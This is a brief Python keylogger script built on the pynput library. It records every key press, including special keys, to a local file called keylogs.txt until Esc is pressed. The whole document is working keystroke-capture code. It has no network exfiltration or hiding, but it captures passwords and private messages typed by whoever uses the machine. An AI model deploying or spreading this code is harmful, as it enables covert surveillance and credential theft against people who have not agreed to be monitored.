from pynput import keyboard

# File where the logs will be saved
log_file = "keylogs.txt"

# Function to handle key presses
def on_press(key):
    try:
        # Log the key pressed to the file
        with open(log_file, "a") as f:
            f.write(f'{key.char}')
    except AttributeError:
        # Handle special keys like Shift, Enter, etc.
        with open(log_file, "a") as f:
            f.write(f' [{key}] ')

# Function to handle key release (optional)
def on_release(key):
    # Stop the listener when 'Esc' is pressed
    if key == keyboard.Key.esc:
        return False

# Setting up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
